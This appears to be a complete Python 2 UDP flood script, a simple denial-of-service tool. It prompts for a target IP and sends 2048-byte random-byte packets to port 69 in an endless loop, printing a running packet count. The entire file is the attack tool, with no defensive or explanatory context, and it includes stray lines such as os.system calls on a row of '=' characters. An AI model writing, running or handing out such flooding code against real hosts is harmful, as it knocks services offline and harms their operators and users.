import sys
import os
import time
import socket
import random


from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)

os.system("clear")
os.system("===============================================================================")

ip = raw_input("IP Target : ")
port = 69

os.system("clear")
os.system("==================================PORT 69==========================================")

time.sleep(1)


sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = 69
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)



